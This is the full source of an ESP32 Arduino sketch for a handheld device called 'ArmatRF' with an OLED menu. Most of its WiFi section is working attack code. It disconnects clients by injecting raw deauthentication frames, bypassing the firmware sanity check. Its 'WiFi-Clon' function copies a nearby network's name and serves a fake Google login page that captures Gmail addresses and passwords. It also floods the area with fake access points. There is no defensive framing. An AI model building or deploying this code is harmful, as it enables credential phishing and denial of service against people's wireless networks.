
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <IRremote.hpp>
#include "esp_wifi.h"

// --- OLED ---
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_ADDR 0x3C
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire);

// --- WiFi ---
WebServer server(80);
DNSServer dnsServer;

// --- IR Remote ---
#define IR_PIN 34  // GPIO34
IRrecv irrecv(IR_PIN);
decode_results results;

// --- Buttons ---
const int Dzax = 18;   // GPIO18
const int Enter = 4;   // GPIO4
const int Aj = 5;      // GPIO5

int dzax = HIGH;
int enter = HIGH;
int aj = HIGH;
int prevDzax = HIGH;
int prevEnter = HIGH;
int prevAj = HIGH;

// --- Menu states ---
bool inMainMenu = true;
bool inWiFiMenu = false;
bool inDeauthMenu = false;

// --- Menu lists ---
String mainMenu[5] = {"WiFi", "BLE", "Settings", "IR", "Exit"};
String wifiMenu[4] = {"WiFi-Clon", "WiFi-Deauth", "WiFi-Spam", "Back"};
String deauthMenu[3] = {"Start Deauth", "Stop Deauth", "Back"};

// --- Variables for WiFi Clone/Deauth ---
String selectedSSID = "";
String capturedGmail = "";
String capturedPassword = "";

#define MAX_NETS 20
String ssidList[MAX_NETS];
uint8_t bssidList[MAX_NETS][6];
int chList[MAX_NETS];
int netCount = 0;
int deauthSelected = 0;
bool deauthRunning = false;

// --- Deauth Structures ---
typedef struct {
  uint16_t frame_control;
  uint16_t duration;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t bssid[6];
  uint16_t sequence_control;
  uint16_t reason_code;
} __attribute__((packed)) deauth_frame_t;

deauth_frame_t deauth_frame;
wifi_promiscuous_filter_t filt = {.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT};

#define DEAUTH_TYPE_SINGLE 0
#define DEAUTH_TYPE_BROADCAST 1
#define NUM_FRAMES_PER_DEAUTH 10
#define DEAUTH_BLINK_TIMES 1
#define DEAUTH_BLINK_DURATION 50

int eliminated_stations = 0;
int current_deauth_type = DEAUTH_TYPE_SINGLE;
int selected_network_index = 0;

// --- WiFi MAC Header Structure ---
typedef struct {
  uint8_t dest_addr[6];
  uint8_t src_addr[6];
  uint8_t bssid[6];
  uint16_t sequence_ctrl;
} wifi_mac_hdr_t;

// --- Deauth Functions ---
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  return 0;
}

void IRAM_ATTR sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (!deauthRunning) return;
  
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  wifi_mac_hdr_t *hdr = (wifi_mac_hdr_t*)pkt->payload;
  
  if (current_deauth_type == DEAUTH_TYPE_SINGLE) {
    if (memcmp(hdr->src_addr, bssidList[selected_network_index], 6) == 0) {
      memcpy(deauth_frame.destination, hdr->src_addr, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, &deauth_frame, sizeof(deauth_frame), false);
      }
      eliminated_stations++;
    }
  } else {
    if (memcmp(hdr->dest_addr, hdr->bssid, 6) == 0 && memcmp(hdr->dest_addr, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0) {
      memcpy(deauth_frame.destination, hdr->src_addr, 6);
      memcpy(deauth_frame.source, hdr->bssid, 6);
      memcpy(deauth_frame.bssid, hdr->bssid, 6);
      for (int i = 0; i < NUM_FRAMES_PER_DEAUTH; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, &deauth_frame, sizeof(deauth_frame), false);
      }
    }
  }
}

void start_deauth(int wifi_number, int attack_type, uint16_t reason = 0x0007) {
  deauthRunning = true;
  eliminated_stations = 0;
  current_deauth_type = attack_type;

  // Initialize deauth frame
  deauth_frame.frame_control = 0xC0;
  deauth_frame.duration = 0;
  deauth_frame.reason_code = reason;

  if (current_deauth_type == DEAUTH_TYPE_SINGLE) {
    memcpy(deauth_frame.destination, bssidList[wifi_number], 6);
    memcpy(deauth_frame.source, bssidList[wifi_number], 6);
    memcpy(deauth_frame.bssid, bssidList[wifi_number], 6);
    
    WiFi.softAP("DEAUTH_AP", NULL, chList[wifi_number], 0, 1);
  } else {
    WiFi.mode(WIFI_MODE_STA);
    WiFi.disconnect();
  }

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
}

void stop_deauth() {
  deauthRunning = false;
  esp_wifi_set_promiscuous(false);
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
}

// --- WiFi Scan ---
void scanNetworksForDeauth() {
  display.clearDisplay();
  display.setCursor(0, 0);
  display.setTextSize(1);
  display.println("Scanning WiFi...");
  display.display();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  netCount = WiFi.scanNetworks();
  if (netCount == 0) {
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println("No networks found");
    display.display();
    delay(1500);
    return;
  }
  if (netCount > MAX_NETS) netCount = MAX_NETS;

  for (int n = 0; n < netCount; n++) {
    ssidList[n] = WiFi.SSID(n);
    uint8_t* bssid = WiFi.BSSID(n);
    if (bssid != NULL) {
      memcpy(bssidList[n], bssid, 6);
    }
    chList[n] = WiFi.channel(n);
  }
}

// --- Phishing Page ---
void startPhishingPage() {
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", []() {
    server.send(200, "text/html",
      "<html><body><center><h2>Google Login</h2>"
      "<form action='/login' method='post'>"
      "Gmail: <input name='gmail' type='text'><br>"
      "Password: <input name='password' type='password'><br>"
      "<input type='submit' value='Login'>"
      "</form></center></body></html>");
  });

  server.on("/login", HTTP_POST, []() {
    capturedGmail = server.arg("gmail");
    capturedPassword = server.arg("password");
    server.send(200, "text/html", "<h2>Thanks! You are logged in.</h2>");

    Serial.println("Gmail: " + capturedGmail);
    Serial.println("Password: " + capturedPassword);

    display.clearDisplay();
    display.setCursor(0, 0);
    display.setTextSize(1);
    display.println("Captured:");
    display.println(capturedGmail);
    display.println(capturedPassword);
    display.display();
  });

  server.onNotFound([]() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  });

  server.begin();
}

// --- WiFi Clone ---
void Clon() {
  int numNetworks = WiFi.scanNetworks();
  int selected = 0;
  int dzax, aj, enter;
  int prevDzax = HIGH, prevAj = HIGH, prevEnter = HIGH;
  int totalOptions = numNetworks + 1;

  while (true) {
    dzax = digitalRead(Dzax);
    aj = digitalRead(Aj);
    enter = digitalRead(Enter);

    if (dzax == LOW && prevDzax == HIGH) selected++;
    if (aj == LOW && prevAj == HIGH) selected--;

    if (selected < 0) selected = totalOptions - 1;
    if (selected >= totalOptions) selected = 0;

    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(0, 0);
    display.println("WiFi Networks:");
    int linesToShow = totalOptions > 4 ? 4 : totalOptions;
    for (int i = 0; i < linesToShow; i++) {
      display.setCursor(0, 12 + i * 12);
      if (i == selected) display.print("> ");
      else display.print(" ");
      if (i < numNetworks) {
        display.println(WiFi.SSID(i));
      } else {
        display.println("Back");
      }
    }
    display.display();

    if (enter == LOW && prevEnter == HIGH) {
      if (selected == numNetworks) {
        break;
      } else {
        selectedSSID = WiFi.SSID(selected);
        Serial.println("Cloning: " + selectedSSID);

        WiFi.mode(WIFI_AP_STA);
        WiFi.softAPConfig(IPAddress(192, 168, 4, 1),
                          IPAddress(192, 168, 4, 1),
                          IPAddress(255, 255, 255, 0));
        WiFi.softAP(selectedSSID.c_str());
        startPhishingPage();

        display.clearDisplay();
        display.setCursor(0, 0);
        display.println("Cloned SSID:");
        display.println(selectedSSID);
        display.println("Press ENTER to stop");
        display.display();

        while (true) {
          dnsServer.processNextRequest();
          server.handleClient();
          delay(10);

          int waitEnter = digitalRead(Enter);
          if (waitEnter == LOW) {
            delay(300);
            WiFi.softAPdisconnect(true);
            dnsServer.stop();
            server.stop();
            WiFi.mode(WIFI_STA);
            WiFi.disconnect();
            break;
          }
        }
      }
    }
    delay(150);
    prevDzax = dzax;
    prevAj = aj;
    prevEnter = enter;
  }
  WiFi.scanDelete();
}

// --- WiFi Spam ---
void spamWiFiMenu() {
  int channel = 1;
  int selected = 0;
  int dzax, aj, enter;
  int prevDzax = HIGH, prevAj = HIGH, prevEnter = HIGH;

  while (true) {
    dzax = digitalRead(Dzax);
    aj = digitalRead(Aj);
    enter = digitalRead(Enter);

    if (dzax == LOW && prevDzax == HIGH) selected++;
    if (aj == LOW && prevAj == HIGH) selected--;

    if (selected < 0) selected = 1;
    if (selected > 1) selected = 0;

    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(0, 0);
    display.println("WiFi Spam:");

    display.setCursor(0, 16);
    if (selected == 0) display.print("> ");
    else display.print(" ");
    display.println("Start Spam");

    display.setCursor(0, 28);
    if (selected == 1) display.print("> ");
    else display.print(" ");
    display.println("Back");

    display.display();

    if (enter == LOW && prevEnter == HIGH) {
      if (selected == 1) {
        break;
      } else {
        while (true) {
          String fakeSSID = "Free_WiFi_" + String(random(1000, 9999));
          WiFi.softAP(fakeSSID.c_str(), "", channel);

          display.clearDisplay();
          display.setCursor(0, 0);
          display.setTextSize(1);
          display.println("Spamming:");
          display.println(fakeSSID);
          display.println("Press ENTER to stop");
          display.display();

          Serial.println("Spammed: " + fakeSSID);
          delay(300);
          WiFi.softAPdisconnect(true);

          channel++;
          if (channel > 13) channel = 1;

          int waitEnter = digitalRead(Enter);
          if (waitEnter == LOW) {
            delay(300);
            WiFi.softAPdisconnect(true);
            WiFi.mode(WIFI_STA);
            break;
          }
        }
      }
    }

    prevDzax = dzax;
    prevAj = aj;
    prevEnter = enter;
    delay(150);
  }
}

// --- Deauth Menu ---
void runDeauthMenu() {
  int selected = 0;
  int dzax, aj, enter;
  int prevDzax = HIGH, prevAj = HIGH, prevEnter = HIGH;

  scanNetworksForDeauth();
  if (netCount == 0) return;

  while (true) {
    dzax = digitalRead(Dzax);
    aj = digitalRead(Aj);
    enter = digitalRead(Enter);

    if (dzax == LOW && prevDzax == HIGH) selected++;
    if (aj == LOW && prevAj == HIGH) selected--;

    if (selected < 0) selected = netCount;
    if (selected > netCount) selected = 0;

    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(0, 0);
    display.println("Select Network:");
    
    int linesToShow = min(4, netCount + 1);
    for (int i = 0; i < linesToShow; i++) {
      int idx = (selected / 4) * 4 + i;
      if (idx > netCount) break;
      
      display.setCursor(0, 12 + i * 12);
      if (idx == selected) display.print("> ");
      else display.print(" ");
      
      if (idx < netCount) {
        display.println(ssidList[idx].substring(0, 15));
      } else {
        display.println("Back");
      }
    }
    display.display();

    if (enter == LOW && prevEnter == HIGH) {
      if (selected == netCount) {
        break;
      } else {
        selected_network_index = selected;
        start_deauth(selected, DEAUTH_TYPE_SINGLE);
        
        display.clearDisplay();
        display.setCursor(0, 0);
        display.println("Deauth Attack:");
        display.println(ssidList[selected]);
        display.println("Press ENTER to stop");
        display.display();

        while (true) {
          delay(100);
          int waitEnter = digitalRead(Enter);
          if (waitEnter == LOW) {
            stop_deauth();
            delay(300);
            break;
          }
        }
      }
    }

    prevDzax = dzax;
    prevAj = aj;
    prevEnter = enter;
    delay(150);
  }
}

// --- IR Menu ---
void runIRMenu() {
  display.clearDisplay();
  display.setCursor(0, 0);
  display.setTextSize(1);
  display.println("IR-Read Mode");
  display.println("Press Enter to exit");
  display.display();

  IrReceiver.begin(IR_PIN, ENABLE_LED_FEEDBACK);

  while (true) {
    if (IrReceiver.decode()) {
      display.clearDisplay();
      display.setCursor(0, 0);
      display.setTextSize(1);
      display.println("IR Signal Received:");
      display.println(IrReceiver.decodedIRData.decodedRawData, HEX);
      display.display();
      Serial.println("IR Code: " + String(IrReceiver.decodedIRData.decodedRawData, HEX));
      IrReceiver.resume();
    }

    int enterState = digitalRead(Enter);
    if (enterState == LOW) {
      delay(300);
      IrReceiver.stop();
      break;
    }
    delay(50);
  }
}

// --- Menu drawing ---
void displayMainMenu(int selected) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(20, 0);
  display.println("==Main Menu==");

  for (int j = 0; j < 5; j++) {
    display.setCursor(18, 12 + j * 12);
    if (j == selected) display.print("> ");
    else display.print(" ");
    display.println(mainMenu[j]);
  }
  display.display();
}

void displayWiFiMenu(int selected) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(20, 0);
  display.println("==WiFi Menu==");

  for (int j = 0; j < 4; j++) {
    display.setCursor(18, 12 + j * 12);
    if (j == selected) display.print("> ");
    else display.print(" ");
    display.println(wifiMenu[j]);
  }
  display.display();
}

// --- Setup ---
void setup() {
  pinMode(Dzax, INPUT_PULLUP);
  pinMode(Aj, INPUT_PULLUP);
  pinMode(Enter, INPUT_PULLUP);

  Serial.begin(9600);

  if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) {
    Serial.println(F("SSD1306 not found"));
    while (true);
  }

  display.clearDisplay();
  display.setTextSize(2);
  display.setTextColor(WHITE);
  display.setCursor(20, 20);
  display.println("ArmatRF");
  display.display();
  delay(1000);

  // Init WiFi
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  displayMainMenu(0);
}

// --- Loop ---
void loop() {
  dzax = digitalRead(Dzax);
  enter = digitalRead(Enter);
  aj = digitalRead(Aj);

  static int mainSelected = 0;
  static int wifiSelected = 0;

  if (inMainMenu) {
    if (dzax == LOW && prevDzax == HIGH) mainSelected++;
    if (aj == LOW && prevAj == HIGH) mainSelected--;
    if (mainSelected > 4) mainSelected = 0;
    if (mainSelected < 0) mainSelected = 4;

    displayMainMenu(mainSelected);

    if (enter == LOW && prevEnter == HIGH) {
      if (mainMenu[mainSelected] == "WiFi") {
        inMainMenu = false;
        inWiFiMenu = true;
        wifiSelected = 0;
        displayWiFiMenu(wifiSelected);
      } else if (mainMenu[mainSelected] == "BLE") {
        display.clearDisplay();
        display.setTextSize(1);
        display.setCursor(0, 0);
        display.println("BLE function");
        display.display();
        delay(1500);
        displayMainMenu(mainSelected);
      } else if (mainMenu[mainSelected] == "Settings") {
        display.clearDisplay();
        display.setTextSize(1);
        display.setCursor(0, 0);
        display.println("Settings");
        display.display();
        delay(1500);
        displayMainMenu(mainSelected);
      } else if (mainMenu[mainSelected] == "IR") {
        runIRMenu();
        displayMainMenu(mainSelected);
      } else if (mainMenu[mainSelected] == "Exit") {
        display.clearDisplay();
        display.setTextSize(1);
        display.setCursor(0, 0);
        display.println("Exit");
        display.display();
        delay(1500);
      }
    }
  } else if (inWiFiMenu) {
    if (dzax == LOW && prevDzax == HIGH) wifiSelected++;
    if (aj == LOW && prevAj == HIGH) wifiSelected--;
    if (wifiSelected > 3) wifiSelected = 0;
    if (wifiSelected < 0) wifiSelected = 3;

    displayWiFiMenu(wifiSelected);

    if (enter == LOW && prevEnter == HIGH) {
      if (wifiMenu[wifiSelected] == "WiFi-Clon") {
        Clon();
      } else if (wifiMenu[wifiSelected] == "WiFi-Deauth") {
        runDeauthMenu();
        displayWiFiMenu(wifiSelected);
      } else if (wifiMenu[wifiSelected] == "WiFi-Spam") {
        spamWiFiMenu();
      } else if (wifiMenu[wifiSelected] == "Back") {
        inWiFiMenu = false;
        inMainMenu = true;
        displayMainMenu(mainSelected);
      }
    }
  }

  prevDzax = dzax;
  prevEnter = enter;
  prevAj = aj;
  delay(150);
}